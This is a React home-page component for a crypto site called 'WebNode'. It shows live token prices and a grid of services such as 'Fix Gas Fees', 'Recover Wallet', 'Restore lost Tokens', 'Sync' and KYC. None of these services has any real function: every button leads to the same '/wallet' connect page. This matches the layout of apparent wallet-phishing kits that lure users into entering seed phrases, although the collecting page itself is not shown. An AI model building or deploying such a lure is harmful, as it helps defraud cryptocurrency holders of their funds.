import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import "./HomePage.css";
import airdropIcon1 from "../assets/modal/airdrop.png";
import airdropIcon2 from "../assets/modal/valid.png";
import airdropIcon3 from "../assets/modal/purchase.jpeg";
import airdropIcon4 from "../assets/modal/Fix gas.png";
import airdropIcon6 from "../assets/modal/kyc.png";
import airdropIcon7 from "../assets/modal/recover.png";
import airdropIcon8 from "../assets/modal/migrate.png";
import airdropIcon9 from "../assets/modal/presale.png";
import airdropIcon10 from "../assets/modal/staking.png";
import discordLogo from "../assets/discord.png"; 
import telegramLogo from "../assets/tele.png";

const features = [
  { name: "Airdrop Management", description: "Manage your crypto airdrops efficiently.", icon: airdropIcon1, buttonName: "Manage Airdrops" },
  { name: "Token Validation", description: "Verify and validate your token transactions.", icon: airdropIcon2, buttonName: "Validate Tokens" },
  { name: "Crypto Purchases", description: "Buy cryptocurrencies seamlessly.", icon: airdropIcon3, buttonName: "Buy Crypto" },
  { name: "Gas Fee Fixes", description: "Optimize and minimize gas fees.", icon: airdropIcon4, buttonName: "Fix Gas Fees" },
  { name: "Restore", description: "Restore lost Tokens", icon: airdropIcon7, buttonName: "Restore" },
  { name: "KYC Verification", description: "Secure and compliant user verification.", icon: airdropIcon6, buttonName: "Verify KYC" },
  { name: "Recovery", description: "Recover lost or inaccessible wallets.", icon: airdropIcon7, buttonName: "Recover Wallet" },
  { name: "Token Migration", description: "Easily migrate your tokens.", icon: airdropIcon8, buttonName: "Migrate Tokens" },
  { name: "Presale Participation", description: "Join exclusive crypto presales.", icon: airdropIcon9, buttonName: "Join Presales" },
  { name: "Synchronization", description: "Sync wallets securely while ensuring user data protection", icon: airdropIcon10, buttonName: "Sync" },
];

const HomePage = () => {
  const [cryptos, setCryptos] = useState([]);
  const cryptoContainerRef = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchCryptoData = async () => {
      try {
        const response = await fetch(
          "https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false"
        );
        if (!response.ok) {
          throw new Error("Failed to fetch data");
        }
        const data = await response.json();
        const topCryptos = data.slice(0, 6).map((crypto) => ({
          name: crypto.symbol.toUpperCase(),
          price: crypto.current_price.toFixed(2),
          profit:
            crypto.price_change_percentage_24h > 0
              ? `+${crypto.price_change_percentage_24h.toFixed(2)}%`
              : `${crypto.price_change_percentage_24h.toFixed(2)}%`,
          logo: crypto.image,
        }));
        setCryptos(topCryptos);
      } catch (error) {
        console.error("Error fetching crypto data:", error);
      }
    };

    fetchCryptoData();
    const interval = setInterval(fetchCryptoData, 10000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (cryptoContainerRef.current) {
      const autoScroll = setInterval(() => {
        cryptoContainerRef.current.scrollBy({
          left: 200,
          behavior: "smooth",
        });
      }, 3000);

      return () => clearInterval(autoScroll);
    }
  }, []);

  const handleButtonClick = () => {
    navigate("/wallet");
  };

  return (
    <div className="homepage">
      <nav className="navbar">
        <div className="navbar-logo">WebNode</div>
        <button className="connect-button" onClick={handleButtonClick}>
          Connect
        </button>
      </nav>

      <div className="hero">
        <h1>Track Crypto Prices and Profits in Real-Time</h1>
        <div className="crypto-background">
          <div className="crypto-prices" ref={cryptoContainerRef}>
            {cryptos.length === 0 ? (
              <p>Loading...</p>
            ) : (
              cryptos.map((crypto, index) => (
                <div key={index} className="crypto-card">
                  <img
                    src={crypto.logo}
                    alt={crypto.name}
                    className="crypto-logo"
                  />
                  <h3>{crypto.name}</h3>
                  <p>Price: ${crypto.price}</p>
                  <p
                    className="crypto-profit"
                    style={{
                      color: crypto.profit.startsWith("+") ? "limegreen" : "red",
                    }}
                  >
                    {crypto.profit}
                  </p>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      <div className="modules">
  <div className="modules-grid">
    {features.map((feature, index) => (
      <div className="module-item" key={index}>
        <img
          src={feature.icon}
          alt={feature.name}
          className="module-icon"
        />
        <h3>{feature.name}</h3>
        <p>{feature.description}</p>
        <button
          className="module-button"
          onClick={handleButtonClick}
        >
          {feature.buttonName}
        </button>
      </div>
    ))}
  </div>
</div>
      {/* Footer with Discord and Telegram links */}
      <div className="footer">
        <div className="social-links">
          <a href="https://discord.com" target="_blank" rel="noopener noreferrer">
            <img src={discordLogo} alt="Discord" className="social-icon" />
          </a>
          <a href="https://t.me" target="_blank" rel="noopener noreferrer">
            <img src={telegramLogo} alt="Telegram" className="social-icon" />
          </a>
        </div>
      </div>
    </div>
  );
};

export default HomePage;
